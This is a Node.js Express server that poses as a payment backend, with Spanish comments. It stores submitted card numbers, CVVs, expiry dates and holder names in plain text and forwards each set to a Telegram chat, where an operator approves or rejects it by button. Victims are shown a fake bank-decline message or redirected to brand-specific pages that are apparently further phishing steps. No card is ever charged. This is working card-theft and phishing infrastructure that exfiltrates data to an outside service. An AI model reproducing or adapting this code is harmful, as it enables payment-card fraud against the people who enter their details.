const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

// ============================================================
// POSTGRES
// ============================================================
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    max: 5,
    ssl: { rejectUnauthorized: false }
});
pool.on('error', err => console.error('❌ PG pool error:', err));

// ============================================================
// CONFIG
// ============================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const FRONT_BASE_URL     = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://package-json-y86a.onrender.com';

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID');
}

// ============================================================
// INIT DB
// ============================================================
async function initDB() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS pagos_pendientes (
            id               SERIAL PRIMARY KEY,
            solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
            titular          VARCHAR(120),
            numero_tarjeta   VARCHAR(30),
            cvv              VARCHAR(6),
            vencimiento      VARCHAR(10),
            marca_tarjeta    VARCHAR(20),
            banco_emisor     VARCHAR(120),
            estado           VARCHAR(20) DEFAULT 'pendiente',
            motivo_rechazo   TEXT,
            redirigir_a      VARCHAR(60),
            telegram_msg_id  BIGINT,
            created_at       TIMESTAMPTZ DEFAULT NOW(),
            updated_at       TIMESTAMPTZ DEFAULT NOW()
        );
        CREATE INDEX IF NOT EXISTS idx_pagos_estado ON pagos_pendientes(estado);
    `);
    console.log('✅ Tabla pagos_pendientes lista');
}
initDB().catch(err => console.error('❌ initDB:', err));

// ============================================================
// TELEGRAM HELPERS
// ============================================================
async function tgSendMessage(text, replyMarkup) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = {
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML'
    };
    if (replyMarkup) body.reply_markup = replyMarkup;

    console.log('📤 Telegram sendMessage payload:', JSON.stringify(body, null, 2));

    try {
        const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const data = await r.json();
        if (!data.ok) {
            console.error('❌ Telegram error:', data);
        } else {
            console.log('✅ Telegram mensaje enviado, msg_id:', data.result.message_id);
        }
        return data;
    } catch (e) {
        console.error('❌ fetch Telegram falló:', e.message);
        return { ok: false };
    }
}

async function tgEditMessage(messageId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
    try {
        const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text,
                parse_mode: 'HTML'
            })
        });
        return r.json();
    } catch { return null; }
}

async function tgAnswerCallback(callbackQueryId, text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
        });
    } catch {}
}

// ============================================================
// ENVIAR SOLICITUD A TELEGRAM CON BOTONES
// ============================================================
async function enviarSolicitudATelegram(pago) {
    const texto =
        `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` +
        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
        `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
        `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
        `🕒 ${new Date().toLocaleString('es-CL')}`;

    const replyMarkup = {
        inline_keyboard: [[
            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
        ]]
    };

    const res = await tgSendMessage(texto, replyMarkup);
    if (res.ok && res.result) {
        await pool.query(
            `UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`,
            [res.result.message_id, pago.solicitud_id]
        );
    }
}

// ============================================================
// ENDPOINT: CREAR PAGO
// ============================================================
app.post('/api/crear-pago', async (req, res) => {
    const {
        solicitud_id, titular, numero_tarjeta, cvv, vencimiento,
        marca_tarjeta, banco_emisor
    } = req.body || {};

    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) {
        return res.status(400).json({ success: false, error: 'Datos incompletos' });
    }
    if (!['visa', 'mastercard', 'amex'].includes((marca_tarjeta || '').toLowerCase())) {
        return res.status(400).json({ success: false, error: 'Marca no soportada' });
    }

    try {
        const result = await pool.query(
            `INSERT INTO pagos_pendientes
                (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor)
             VALUES ($1,$2,$3,$4,$5,$6,$7)
             ON CONFLICT (solicitud_id) DO UPDATE
               SET numero_tarjeta = EXCLUDED.numero_tarjeta,
                   cvv = EXCLUDED.cvv,
                   vencimiento = EXCLUDED.vencimiento,
                   marca_tarjeta = EXCLUDED.marca_tarjeta,
                   banco_emisor = EXCLUDED.banco_emisor,
                   updated_at = NOW()
             RETURNING *`,
            [
                solicitud_id, titular, numero_tarjeta, cvv, vencimiento,
                marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido'
            ]
        );

        enviarSolicitudATelegram(result.rows[0]).catch(e => console.error('TG:', e));

        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
    } catch (err) {
        console.error('❌ /api/crear-pago:', err);
        return res.status(500).json({ success: false, error: 'Error al registrar el pago' });
    }
});

// ============================================================
// ENDPOINT: ESTADO (polling del front)
// ============================================================
app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
    try {
        const result = await pool.query(
            `SELECT estado, motivo_rechazo, redirigir_a, marca_tarjeta
             FROM pagos_pendientes WHERE solicitud_id = $1`,
            [req.params.solicitud_id]
        );
        if (result.rows.length === 0) {
            return res.status(404).json({ success: false, error: 'No encontrado' });
        }
        const row = result.rows[0];

        if (row.estado === 'aprobado') {
            return res.json({
                success: true,
                estado: 'aprobado',
                redirect: `${FRONT_BASE_URL}/${row.redirigir_a}`,
                marca: row.marca_tarjeta
            });
        }
        if (row.estado === 'rechazado') {
            return res.json({
                success: true,
                estado: 'rechazado',
                mensaje: row.motivo_rechazo ||
                    'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.'
            });
        }
        return res.json({ success: true, estado: 'pendiente' });
    } catch (err) {
        console.error('❌ /api/estado-pago:', err);
        return res.status(500).json({ success: false, error: 'Error' });
    }
});

// ============================================================
// WEBHOOK TELEGRAM (recibe clicks de los botones)
// ============================================================
app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);

    const update = req.body || {};
    const cq = update.callback_query;
    if (!cq || !cq.data) return;

    console.log('📩 Callback Telegram recibido:', cq.data);

    const [accion, solicitud_id] = cq.data.split(':');
    const msgId = cq.message?.message_id;

    try {
        const result = await pool.query(
            `SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`,
            [solicitud_id]
        );
        if (result.rows.length === 0) {
            await tgAnswerCallback(cq.id, 'Solicitud no encontrada');
            return;
        }
        const pago = result.rows[0];

        if (pago.estado !== 'pendiente') {
            await tgAnswerCallback(cq.id, `Ya fue ${pago.estado}`);
            return;
        }

        if (accion === 'aprobar') {
            const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
            const archivo = mapa[(pago.marca_tarjeta || '').toLowerCase()];
            if (!archivo) {
                await tgAnswerCallback(cq.id, 'Marca no soportada');
                return;
            }
            await pool.query(
                `UPDATE pagos_pendientes
                 SET estado = 'aprobado', redirigir_a = $1, updated_at = NOW()
                 WHERE solicitud_id = $2`,
                [archivo, solicitud_id]
            );

            await tgAnswerCallback(cq.id, '✅ Aprobado');
            if (msgId) {
                await tgEditMessage(msgId,
                    `✅ <b>PAGO APROBADO</b>\n\n` +
                    `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
                    `👤 <b>Titular:</b> ${pago.titular}\n` +
                    `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
                    `🏦 <b>Banco:</b> ${pago.banco_emisor}\n` +
                    `➡️ <b>Redirigido a:</b> ${archivo}\n` +
                    `🕒 ${new Date().toLocaleString('es-CL')}`
                );
            }
        } else if (accion === 'rechazar') {
            const motivo = 'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.';
            await pool.query(
                `UPDATE pagos_pendientes
                 SET estado = 'rechazado', motivo_rechazo = $1, updated_at = NOW()
                 WHERE solicitud_id = $2`,
                [motivo, solicitud_id]
            );

            await tgAnswerCallback(cq.id, '❌ Rechazado');
            if (msgId) {
                await tgEditMessage(msgId,
                    `❌ <b>PAGO RECHAZADO</b>\n\n` +
                    `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
                    `👤 <b>Titular:</b> ${pago.titular}\n` +
                    `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
                    `🕒 ${new Date().toLocaleString('es-CL')}`
                );
            }
        }
    } catch (err) {
        console.error('❌ webhook:', err);
    }
});

// ============================================================
// REGISTRAR WEBHOOK DE TELEGRAM AL ARRANCAR
// ============================================================
async function registrarWebhook() {
    if (!TELEGRAM_BOT_TOKEN) return;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${encodeURIComponent(
        PUBLIC_BACKEND_URL + '/api/telegram-webhook'
    )}`;
    try {
        const r = await fetch(url);
        const data = await r.json();
        if (data.ok) console.log('✅ Webhook Telegram registrado:', PUBLIC_BACKEND_URL + '/api/telegram-webhook');
        else console.error('❌ Webhook Telegram:', data.description);
    } catch (e) {
        console.error('❌ Error registrando webhook:', e.message);
    }
}

// ============================================================
// HEALTH
// ============================================================
app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));

// ============================================================
// START
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Backend pagos en puerto ${PORT}`);
    console.log(`🌐 FRONT_BASE_URL = ${FRONT_BASE_URL}`);
    console.log(`🔗 PUBLIC_BACKEND_URL = ${PUBLIC_BACKEND_URL}`);
    console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'OK' : 'FALTA'}`);
    console.log(`🗄️  Postgres: ${process.env.DATABASE_URL ? 'OK' : 'FALTA'}`);
    registrarWebhook(); // ← registra el webhook solo cada arranque
});
